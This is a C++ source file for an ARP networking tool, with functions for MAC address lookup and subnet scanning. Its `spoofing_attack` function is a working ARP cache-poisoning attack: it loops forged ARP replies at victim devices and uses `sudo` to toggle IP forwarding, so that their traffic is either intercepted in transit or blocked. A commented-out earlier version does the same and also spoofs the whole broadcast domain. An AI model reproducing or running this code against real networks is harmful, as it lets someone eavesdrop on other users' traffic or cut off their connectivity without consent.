#include "arp_tool.h"

#include "src/abstract/receiving/recv_queue.h"

#include "src/protocols/ether2/ethertype.h"

#include <linux/if_arp.h> // todo remove this

#include <cstdio>
#include <iostream>
#include <vector>
#include <cstdint>
using namespace std;


mac_addr arp_tool::search_for_mac_addr(shared_ptr<net_access_bytes> const& broadcast_access, ip4_addr const& searched_ip, mac_addr const& src_mac, ip4_addr const& src_ip) {
    // listen to arp replies via a queue
    shared_ptr<recv_queue<arp_header>> queue = make_shared<recv_queue<arp_header>>();
    arp_protocol::connect_recv(broadcast_access, queue, arp_op_values::reply);

    // prepare arp request
    struct arp_header arp_header;
    arp_header.hard_type = ARPHRD_ETHER; // todo this value from my own list
    arp_header.prot_type = ethertype::ip4;
    arp_header.hard_addr_sz = sizeof(mac_addr); // len of mac addr
    arp_header.prot_addr_sz = sizeof(ip4_addr); // len of ipv4 addr
    arp_header.op = arp_op_values::request; // operation (request) // todo this value from my own list

    arp_header.sender_hard_addr = vector<uint8_t>(src_mac.octets, src_mac.octets + sizeof(src_mac.octets));
    arp_header.sender_prot_addr = vector<uint8_t>(src_ip.octets, src_ip.octets + sizeof(src_ip.octets));

    arp_header.target_hard_addr = vector<uint8_t>(mac_addr_empty.octets, mac_addr_empty.octets + sizeof(mac_addr_empty.octets));
    arp_header.target_prot_addr = vector<uint8_t>(searched_ip.octets, searched_ip.octets + sizeof(searched_ip.octets));

    while (true) {
        // send request
        puts("sending arp request");
        arp_protocol::send(broadcast_access, arp_header);

        // recv reply
        puts("waiting for reply");
        struct arp_header* reply = queue->queue.front(std::chrono::milliseconds(50)); // todo be able to control this value
        if (reply == nullptr) continue; // no response in a reasonable time, continue and send again
        queue->queue.pop_front();

        // ensure it is a reply packet (no need, this is done directly via the connect_recv registration)
        // if ((*reply)->op != arp_op_values::reply) continue;
        
        // ensure the ip reply is the searched_ip
        ip4_addr reply_ip;
        extract_from_network_order(&reply_ip, reply->sender_prot_addr.data());
        if (reply_ip != searched_ip) continue;

        // success, found the mac addr of search_ip
        mac_addr res{};
        extract_from_network_order(&res, reply->sender_hard_addr.data());
        
        queue->queue.clear(); // clear any trailing replies

        return res;
    }
}

map<ip4_addr, mac_addr> arp_tool::scan_entire_subnet(shared_ptr<net_access_bytes> const& broadcast_access, ip4_subnet_mask mask, mac_addr src_mac, ip4_addr src_ip) {
    // listen to arp replies via a queue
    shared_ptr<recv_queue<arp_header>> queue = make_shared<recv_queue<arp_header>>();
    arp_protocol::connect_recv(broadcast_access, queue, arp_op_values::reply);

    // send requests
    ip4_addr curr_ip = smallest_ip_addr_in_subnet(mask);
    while (true) {
        if (!is_inside_subnet(mask, curr_ip)) break;

        // cout << "sending request for ip: " << ip4_addr_to_str(curr_ip) << endl;

        // arp header
        struct arp_header arp_header;
        arp_header.hard_type = ARPHRD_ETHER; // todo this value from my own list
        arp_header.prot_type = ethertype::ip4;
        arp_header.hard_addr_sz = sizeof(mac_addr); // len of mac addr
        arp_header.prot_addr_sz = sizeof(ip4_addr); // len of ipv4 addr
        arp_header.op = arp_op_values::request; // operation (request) // todo this value from my own list

        arp_header.sender_hard_addr = vector<uint8_t>(src_mac.octets, src_mac.octets + sizeof(src_mac.octets));
        arp_header.sender_prot_addr = vector<uint8_t>(src_ip.octets, src_ip.octets + sizeof(src_ip.octets));

        arp_header.target_hard_addr = vector<uint8_t>(mac_addr_empty.octets, mac_addr_empty.octets + sizeof(mac_addr_empty.octets));
        arp_header.target_prot_addr = vector<uint8_t>(curr_ip.octets, curr_ip.octets + sizeof(curr_ip.octets));

        // send request
        arp_protocol::send(broadcast_access, arp_header);

        // advance curr_ip
        curr_ip = generate_next_ip(curr_ip);

        // wait some dealy
        // std::this_thread::sleep_for(std::chrono::milliseconds(50)); // todo be able to control this value
    }

    cout << "sent all the requests, waiting and processing replies" << endl;

    // wait some reasonable time for all the replies
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));

    // process all the replies
    map<ip4_addr, mac_addr> res;
    while (!queue->queue.is_empty()) {
        struct arp_header* reply = queue->queue.front(std::chrono::milliseconds(0));
        if (reply == nullptr) continue; // no reply?
        queue->queue.pop_front();

        // ensure it is a reply packet (no need, this is done directly via the listening registration)
        // if ((*reply)->op != ARP_OP_REPLY) continue;
        
        // extract the ip4 addr
        ip4_addr reply_ip;
        extract_from_network_order(&reply_ip, reply->sender_prot_addr.data());

        // ensure the ip reply is within the subnet mask
        if (!is_inside_subnet(mask, reply_ip)) continue;

        // check if this ip was already found
        if (res.count(reply_ip)) continue;

        // extract the mac addr
        mac_addr reply_mac{};
        extract_from_network_order(&reply_mac, reply->sender_hard_addr.data());

        // add to res
        res[reply_ip] = reply_mac;
    }

    cout << "search completed, received " << res.size() << " entries" << endl;

    return res;
}


// arp_scanner::arp_scanner() : queue(make_shared<recv_queue<shared_ptr<arp_header>>>()) {
// }


// void arp_scanner::spoof_as_device(const std::vector<ip4_addr> &victims_ip, ip4_addr target_ip,
//                               mac_addr src_mac, ip4_addr src_ip) {
//     int no_victims = victims_ip.size();

//     vector<mac_addr> victim_macs(no_victims);
//     for (int i = 0; i < no_victims; i++)
//         victim_macs[i] = search_for_mac_addr(victims_ip[i], src_mac, src_ip);

// #define BUFF_SZ 65536
//     uint8_t buff[BUFF_SZ] = {0};

//     // prepare net_arp
//     struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
//     arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
//     arp_header->arp_pro = htons(ethernet_header::ethertype_values::ip4); // first net_arp octets type: ip
//     arp_header->arp_hln = ETH_ALEN; // len of mac octets
//     arp_header->arp_pln = 4; // len of ip octets
//     arp_header->arp_op = htons(arp_op_values::reply); // type of net_arp (forged reply)

//     write_in_network_order(arp_header->arp_sha, &src_mac); // my spoofed mac octets
//     write_in_network_order(arp_header->arp_spa, &target_ip);


//     while (true) {
//         std::this_thread::sleep_for(300ms);

//         if (victims_ip.empty()) { // spoof whole broadcast
//             memset(arp_header->arp_tha, 0xff, ETH_ALEN);
//             memset(arp_header->arp_tpa, 0x00, 4);

//             ether_client.next_dest_addr.set_next_choice(mac_addr_broadcast);
//             ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);

//             int cnt = sizeof(ether_arp);
//             send_msg_t request;
//             memcpy(request.get_active_buff(), buff, cnt);
//             request.set_count(cnt);
//             ether_client.send_data(std::move(request));

//         } else { // spoof every victim
//             for (int i = 0; i < no_victims; i++) {
//                 ip4_addr victim_ip = victims_ip[i];
//                 mac_addr victim_mac = victim_macs[i];

//                 // send to specific target_ip
//                 write_in_network_order(arp_header->arp_tha, &victim_mac);
//                 write_in_network_order(arp_header->arp_tpa, &victim_ip);

//                 ether_client.next_dest_addr.set_next_choice(victim_mac);
//                 ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);

//                 int cnt = sizeof(ether_arp);
//                 send_msg_t request;
//                 memcpy(request.get_active_buff(), buff, cnt);
//                 request.set_count(cnt);
//                 ether_client.send_data(std::move(request));
//             }

//         }

//         std::cout << "spoofed frames sent" << endl;
//     }

// }

// void net_arp::intercept_device_traffic(const vector<ip4_addr> &victim_devices, ip4_addr dest, bool block, mac_addr src_mac, ip4_addr src_ip) {
//     // block/allow traffic (linux)
//     if (block) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");
//     else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");

//     spoof_as_device(victim_devices, dest, src_mac, src_ip);
// //    if (bidirectional)
// //        for (ip4_addr victim: victim_devices)
// //            spoof_as_device({dest}, victim, my_mac);

// }


void arp_tool::announce_new_pair(shared_ptr<net_access_bytes> const& broadcast_access, ip4_addr new_ip, mac_addr new_mac) {
    // arp header
    struct arp_header arp_header;
    arp_header.hard_type = ARPHRD_ETHER; // todo this value from my own list
    arp_header.prot_type = ethertype::ip4;
    arp_header.hard_addr_sz = sizeof(mac_addr); // len of mac addr
    arp_header.prot_addr_sz = sizeof(ip4_addr); // len of ipv4 addr
    arp_header.op = arp_op_values::reply; // operation (reply) // todo this value from my own list

    arp_header.sender_hard_addr = vector<uint8_t>(new_mac.octets, new_mac.octets + sizeof(new_mac.octets));
    arp_header.sender_prot_addr = vector<uint8_t>(new_ip.octets, new_ip.octets + sizeof(new_ip.octets));

    arp_header.target_hard_addr = vector<uint8_t>(mac_addr_empty.octets, mac_addr_empty.octets + sizeof(mac_addr_empty.octets));
    arp_header.target_prot_addr = vector<uint8_t>(ip4_addr_empty.octets, ip4_addr_empty.octets + sizeof(ip4_addr_empty.octets));
    
    // send
    arp_protocol::send(broadcast_access, arp_header);

}

void arp_tool::spoofing_attack(
    vector<tuple<shared_ptr<net_access_bytes>, mac_addr, ip4_addr>> targets,
    ip4_addr dest_ip,
    mac_addr src_mac, ip4_addr src_ip,
    bool block
) {
    // arp header
    struct arp_header arp_header;
    arp_header.hard_type = ARPHRD_ETHER; // todo this value from my own list
    arp_header.prot_type = ethertype::ip4;
    arp_header.hard_addr_sz = sizeof(mac_addr); // len of mac addr
    arp_header.prot_addr_sz = sizeof(ip4_addr); // len of ipv4 addr
    arp_header.op = arp_op_values::reply; // operation (reply) // todo this value from my own list

    arp_header.sender_hard_addr = vector<uint8_t>(src_mac.octets, src_mac.octets + sizeof(src_mac.octets)); // the victim sends data to src_mac

    // assuming src_mac and src_ip is us
    if (block) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null"); // don't forward data
    else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null"); // forward data

    arp_header.sender_prot_addr = vector<uint8_t>(dest_ip.octets, dest_ip.octets + sizeof(dest_ip.octets));

    size_t cnt = 0;
    while (true) {
        for (auto& [net_access, assoc_mac_addr, assoc_ip4_addr] : targets) {
            arp_header.target_hard_addr = vector<uint8_t>(assoc_mac_addr.octets, assoc_mac_addr.octets + sizeof(assoc_mac_addr.octets));
            arp_header.target_prot_addr = vector<uint8_t>(assoc_ip4_addr.octets, assoc_ip4_addr.octets + sizeof(assoc_ip4_addr.octets));

            arp_protocol::send(net_access, arp_header);
        }

        std::cout << "spoofed data num " << cnt << " sent" << endl;
        ++cnt;

        // wait some dealy
        std::this_thread::sleep_for(std::chrono::milliseconds(300)); // todo be able to control this value
    }
}